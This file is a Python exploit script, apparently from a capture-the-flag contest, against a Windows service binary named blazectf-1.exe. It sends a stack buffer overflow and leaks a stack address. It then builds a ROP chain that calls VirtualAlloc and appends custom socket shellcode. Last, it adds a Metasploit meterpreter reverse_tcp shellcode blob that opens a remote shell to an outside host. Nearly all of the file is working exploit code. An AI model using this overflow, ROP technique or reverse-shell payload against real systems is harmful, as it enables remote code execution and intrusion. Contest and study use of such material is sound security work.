import struct
import socket
import time
import hexdump
from pwn import *

p32 = lambda x: struct.pack("<L", x)
u32 = lambda x: struct.unpack("<L", x)[0]

HOST, PORT = '192.168.137.153', 42069
HOST, PORT = 'hotbox.420blaze.in', 42071
go = lambda: socket.create_connection((HOST, PORT))
h = 0x1b0
for i in range(16):
    sc = go()
    sc.send('a' * 0xc4 + p32(0) + p32(0x40176a))
    time.sleep(0.3)
sc = go()
sc.send('a' * 0xc4 + p32(0) + p32(0x40152f) * 3 + p32(0x4016d0))
sp = u32(sc.recv(4))
print hex(sp)

def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      0x77bb208a,  # POP ECX # RETN [msvcrt.dll] 
      0x77ba1100,  # ptr to &VirtualAlloc() [IAT msvcrt.dll]
      0x0040528a,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [blazectf-1.exe] 
      0x77bb0c86,  # XCHG EAX,ESI # RETN [msvcrt.dll] 
      0x004058cd,  # POP EBP # RETN [blazectf-1.exe] 
      0x77eb4303,  # & call esp [kernel32.dll]
      0x77bd7031,  # POP EBX # RETN [msvcrt.dll] 
      0x00000001,  # 0x00000001-> ebx
      0x0040f913,  # POP EDX # RETN [blazectf-1.exe] 
      0x00001000,  # 0x00001000-> edx
      0x77bbdee3,  # POP ECX # RETN [msvcrt.dll] 
      0x00000040,  # 0x00000040-> ecx
      0x0040584b,  # POP EDI # RETN [blazectf-1.exe] 
      0x77bda010,  # RETN (ROP NOP) [msvcrt.dll]
      0x77bc5d88,  # POP EAX # RETN [msvcrt.dll] 
      0x90909090,  # nop
      0x7c82e243,  # PUSHAD # RETN [ntdll.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

rop_chain = create_rop_chain()


time.sleep(2)
sc = go()
shcode = asm(
    '''
    sub esp, 0x800
    mov eax, [0x411108]
    push esp
    push 0x202
    call eax
    mov eax, [0x411128]
    push 0
    push 1
    push 2
    call eax
    mov edi, eax
    mov esi, esp
    add esp, 0x100
    push 0
    push 0
    push 0
    push 0x55a40002
    mov ebp, esp
    mov esp, esi
    push 0x10
    push ebp
    push edi
    mov eax, [0x411114]
    call eax
    push 5
    push edi
    mov eax, [0x41111c]
    call eax
    push ebp
    add dword ptr [esp], -4
    mov dword ptr [ebp-4], 16
    push ebp
    push edi
    mov eax, [0x411110]
    call eax
    mov edi, eax
    push 0
    push 0x100
    push ebp
    push edi
    mov eax, [0x411124]
    call eax
    '''
    )

# from metasploit
# windows/meterpreter/reverse_tcp

buf =  ""
buf += "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
buf += "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
buf += "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
buf += "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
buf += "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
buf += "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
buf += "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
buf += "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
buf += "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
buf += "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
buf += "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
buf += "\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8\xff"
buf += "\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80"
buf += "\x6b\x00\xff\xd5\x6a\x0a\x68\x0d\xe6\xbc\x50\x68\x02"
buf += "\x00\x7a\x69\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50"
buf += "\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68"
buf += "\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08"
buf += "\x75\xec\xe8\x67\x00\x00\x00\x6a\x00\x6a\x04\x56\x57"
buf += "\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x36\x8b"
buf += "\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58"
buf += "\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68"
buf += "\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68"
buf += "\x00\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff"
buf += "\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c"
buf += "\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff\xff\x01"
buf += "\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00"
buf += "\x53\xff\xd5"

sc.send('a' * 0xc4 + p32(0) + rop_chain + shcode + buf)

time.sleep(1)
while True:
    sc = go()
    print `sc.recv(0x100)`
    print 'yey.'

exit()
try:
    leak = sc.recv(0x100)
    if leak:
        exit()
except:
    pass
sc.close()
print hex(sp)

print hex(h)
hexdump.hexdump(leak)
